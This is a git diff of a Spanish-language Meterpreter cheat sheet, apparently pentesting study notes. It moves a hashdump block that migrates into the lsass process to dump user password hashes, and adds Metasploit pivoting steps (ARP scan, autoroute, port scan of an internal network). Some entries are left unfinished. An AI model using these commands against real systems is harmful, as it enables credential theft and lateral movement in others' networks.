@@ -1,6 +1,6 @@
-# Meterpreter Commands
+# Meterpreter
 
-Tags: #Comandos #Meterpreter 
+Tags: #Comandos #Meterpreter #Pivoting 
 
 ## Meterpreter 
 
@@ -20,6 +20,14 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ```
 
 ## Comandos con Meterpreter
+
+```bash 
+# Migrar a un proceso con mayores privilegios para tener un 'Meterpreter x64/Windows'
+
+❯ hashdump                   # Te muestra todos los hashes de los usuarios, en dado caso que te salga este error 'Operation_failed: The parameter is incorrect', debemos de migrar a otro proceso.
+	❯ pgrep lsass              # Mirar el numero del proceso 'lsass'  
+	❯ migrate <ID>             # Nos migramos al proceso y asi poder mejorar la consola de Meterpreter, por lo que ahora podremos hacer el dumpeo de Hashes.  
+```
 
 ```bash 
 # Cuando tienes la sesion con Meterpreter 
@@ -42,17 +50,29 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ❯ pwd                        # Nos muestra la ruta del dir actual 
 ❯ cd /                       # Nos dirigimos a la raiz 'C:\'
 ❯ cat file.txt               # Miramos el contenido de un archivo 
-
-❯ hashdump                   # Te muestra todos los hashes de los usuarios, en dado caso que te salga este error 'Operation_failed: The parameter is incorrect', debemos de migrar a otro proceso.
-	❯ pgrep lsass              # Mirar el numero del proceso 'lsass'  
-	❯ migrate <ID>             # Nos migramos al proceso y asi poder mejorar la consola de Meterpreter, por lo que ahora podremos hacer el dumpeo de Hashes.  
 ```
 
 ## Para hacer Pivoting con Metasploit
 
 ```bash 
-❯ arp                      #
+❯ run arp_scanner -r IP.0/24              # Barrido ARP en la direccion IP 
+
+1. Agregar la IP a la tabla de ruteo
+❯ run autoroute -s IP.0/24                # Agregas la IP a la tabla de ruteo para alcanzar la nueva red
+
+2. Te sales de la sesion y puedes ver la tabla de ruteo
+❯ Ctrl + z                                # Poner en background la sesion
+❯ route print                             # Mirar la tabla de ruteo 
+
+3. Fuera de la sesion usas el scanner para ver los puertos de la maquina agregada
+❯ use auxiliary/scanner/portscan/tcp      # Hacer escaneo con Nmap
+	❯ options 
+	❯ set ports 1-1000                # Escanearemos los primero 1000 puertos 
+	❯ set rhosts <IP>                 # Colocamos la IP de la maquina a la que no llegabamos y ahora si por el Pivoting
+	❯ run 
+
+4. 
 ❯ netstat                  # 
-❯ route                    # 
+
 ❯ portfwd                  # 
 ```
